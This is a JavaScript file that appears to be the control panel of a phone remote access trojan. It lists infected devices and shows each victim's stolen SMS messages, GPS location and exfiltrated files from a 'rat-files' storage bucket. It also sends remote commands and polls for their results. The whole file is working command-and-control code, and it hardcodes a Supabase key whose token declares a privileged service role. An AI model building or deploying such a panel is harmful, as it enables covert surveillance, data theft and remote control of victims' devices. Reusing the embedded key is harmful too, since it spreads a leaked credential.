const SUPABASE_URL = 'https://vlagzffbisnnandnztlt.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZsYWd6ZmZiaXNubmFuZG56dGx0Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NDYxMzE5NiwiZXhwIjoyMDkwMTg5MTk2fQ.KEFNG1-GRwJvNvEyNczuaRWslVFDknKHdZw6kBf_Hq4';
const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

let currentDeviceId = null;

async function fetchDevices() {
    const { data } = await supabase.from('devices').select('*');
    const listContent = document.getElementById('device-list-content');
    listContent.innerHTML = '';
    data.forEach(device => {
        const el = document.createElement('div');
        el.className = 'device-item';
        el.textContent = `${device.model} - ${new Date(device.last_seen).toLocaleString()}`;
        el.onclick = () => selectDevice(device.id);
        listContent.appendChild(el);
    });
}

async function selectDevice(deviceId) {
    currentDeviceId = deviceId;
    document.getElementById('device-details').style.display = 'block';
    document.getElementById('device-name').textContent = `Device: ${deviceId}`;
    showTab('info');
}

function showTab(tabName) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
    document.getElementById(`${tabName}-tab`).classList.add('active');
    event.target.classList.add('active');

    if (!currentDeviceId) return;
    const deviceRef = supabase.from('devices').select('*').eq('id', currentDeviceId);
    const smsRef = supabase.from('sms_logs').select('*').eq('device_id', currentDeviceId);
    const locRef = supabase.from('locations').select('*').eq('device_id', currentDeviceId).order('timestamp', { ascending: false }).limit(1);
    const filesRef = supabase.storage.from('rat-files').list(currentDeviceId);

    switch (tabName) {
        case 'info': deviceRef.then(({ data }) => document.getElementById('info-tab').innerHTML = `<pre>${JSON.stringify(data[0], null, 2)}</pre>`); break;
        case 'sms': smsRef.then(({ data }) => {
            let html = ''; data.forEach(s => html += `<p><b>${s.address}:</b> ${s.body}</p>`); document.getElementById('sms-tab').innerHTML = html;
        }); break;
        case 'location': locRef.then(({ data }) => {
            if (data.length > 0) { const l = data[0]; document.getElementById('location-tab').innerHTML = `<p>Lat: ${l.lat}, Lon: ${l.lon}</p><a href="https://maps.google.com?q=${l.lat},${l.lon}" target="_blank">View on Map</a>`; }
        }); break;
        case 'files': filesRef.then(({ data }) => {
            let html = ''; data.forEach(f => { const url = supabase.storage.from('rat-files').getPublicUrl(`${currentDeviceId}/${f.name}`).data.publicUrl; html += `<a href="${url}" target="_blank">${f.name}</a><br>`; }); document.getElementById('files-tab').innerHTML = html;
        }); break;
    }
}

async function sendCommand(cmd) {
    if (!currentDeviceId) return;
    const { data } = await supabase.from('commands').insert({ device_id: currentDeviceId, command: cmd, status: 'pending' }).select();
    document.getElementById('command-output').innerHTML = `<p>Command '${cmd}' sent.</p>`;
    // Poll for result
    const pollId = setInterval(async () => {
        const { data: res } = await supabase.from('commands').select('result, status').eq('id', data[0].id).single();
        if (res.status === 'completed') {
            clearInterval(pollId);
            document.getElementById('command-output').innerHTML += `<p>Result: ${res.result}</p>`;
        }
    }, 2000);
}

fetchDevices();
setInterval(fetchDevices, 10000); // Refresh device list
